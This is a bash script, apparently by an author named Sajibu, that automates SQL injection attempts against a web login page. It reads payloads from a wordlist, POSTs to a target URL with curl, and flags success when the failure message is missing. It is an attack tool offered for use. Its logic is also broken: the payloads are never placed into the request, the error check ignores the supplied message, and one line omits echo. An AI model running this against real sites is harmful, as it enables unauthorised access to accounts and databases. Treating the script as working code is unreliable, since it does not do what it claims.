#!/bin/bash

# HTTP login page Brute Force with SQL Queries by Sajibu

# Parsing Arguments

while [[ $# -gt 0 && $# -lt 11 ]]; do

  case "$1" in
    -u|--url)
      URL="$2"
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST="$2"
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN="$2"
      shift # past argument
      shift # past value
      ;;
    -H|--header)
      HEADER=$2
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR="$2"
      shift # past argument
      shift # past value
      ;;
    -h|--help)
	  echo -e "USAGE:\n-u | --url = Supply the login page, for example: http://192.168.98.200/login.php\n-w | --wordlist = SQL Injection wordlist path\n-r | --request = Request header, for example: 'user=admin&password=123' Must be with single quotes!\n-H | --header (Optional) = Any curl header, for example: 'X-Forwarded-For: 10.10.10.10' Must be with single quotes!\n-e | --error = Error message when credentials is incorrect, example: 'Invalid user or password.' Must be with single quotes!"
      shift # past argument
      exit 1
      ;;
    -*|--*)
      echo "Unknown option $1"
      exit 1
      ;;

  esac

done

while [[ $# -gt 0 && $# -lt 11 ]]; do

    case "$3" in
    -u|--url)
      URL="$4"
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST="$4"
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN="$4"
      shift # past argument
      shift # past value
      ;;
    -H|--header)
      HEADER="$4"
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR="$4"
      shift # past argument
      shift # past value
      ;;
    -*|--*)
      echo "Unknown option $5"
      exit 1
      ;;
        
  esac

done

while [[ $# -gt 0 && $# -lt 11 ]]; do

    case "$5" in
    -u|--url)
      URL="$6"
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST="$6"
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN="$6"
      shift # past argument
      shift # past value
      ;;
    -H|--header)
      HEADER=$6
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR="$6"
      shift # past argument
      shift # past value
      ;;
    -*|--*)
      echo "Unknown option $5"
      exit 1
      ;;

  esac

done

while [[ $# -gt 0 && $# -lt 11 ]]; do

    case "$7" in
    -u|--url)
      URL="$8"
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST="$8"
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN="$8"
      shift # past argument
      shift # past value
      ;;
    -H|--header)
      HEADER=$8
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR="$8"
      shift # past argument
      shift # past value
      ;;
    -*|--*)
      echo "Unknown option $7"
      exit 1
      ;;

  esac

done

while [[ $# -gt 0 && $# -lt 11 ]]; do

    case "$9" in
    -u|--url)
      URL="${10}"
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST="${10}"
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN="${10}"
      shift # past argument
      shift # past value
      ;;
    -H|--header)
      HEADER=${10}
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR="${10}"
      shift # past argument
      shift # past value
      ;;
    -*|--*)
      echo "Unknown option $9"
      exit 1
      ;;

  esac

done


if [[ "$URL" == '' ]]; then

	echo "[-] URL is not specified, use -u or --url."

	if [[ "$LOGIN" == '' ]]; then

		echo "[-] Request header is not specified, use -r|--request."
    fi

	if [[ "$ERROR" == '' ]]; then

		"[-] Header - Incorrect Credentials isn't specified, use -e or --error."
		
	fi

	if [[ "$WORDLIST" == '' ]]; then

		echo "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."
	fi
		
    echo "[-] Please use single quotes and type -h or --help for usage."

	exit

fi

if [[ "$LOGIN" == '' ]]; then

	echo "[-] Request header is not specified, use -r|--request."

	if [[ "$ERROR" == '' ]]; then

		echo "[-] Header - Incorrect Credentials isn't specified, use -e or --error."

		
	fi

	if [[ "$WORDLIST" == '' ]]; then

		echo "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."

	exit

	fi
		
fi

	
if [[ "$ERROR" == '' ]]; then

	echo "[-] Header - Incorrect Credentials isn't specified, use -e or --error."

	if [[ "$WORDLIST" == '' ]]; then

		echo "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."

	    exit
	fi	
		
fi

		
if [[ "$WORDLIST" == '' ]]; then

	echo "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."

	exit	

fi

# Variables

PASS="test"
wordlist=${WORDLIST}

## Counter
i=0

# Main loop 
while read -r wordlist; do
    
    # Increase counter
    ((i=i+1))

    # Feedback for user
    echo "[-] Try ${i}: ${wordlist}"

    # Connect to server
    if [[ $HEADER != '' ]]; then
    	REQUEST=$( curl -s "${URL}" -X "POST" -H "${HEADER}" -d "$LOGIN")

    else
    	REQUEST=$( curl -s "${URL}" -X "POST" -d "$LOGIN")
    fi

    # Check response
    Final_Request=$(echo $REQUEST | grep "Invalid user or password.")
    
    if [[ "$Final_Request" != *"$ERROR"* ]]; then
      # Success!
      echo -e "[*] Injection worked!"
      echo "[*] SQL Query in Username field is: ${wordlist}"
      break 2
    fi

done < ${wordlist}
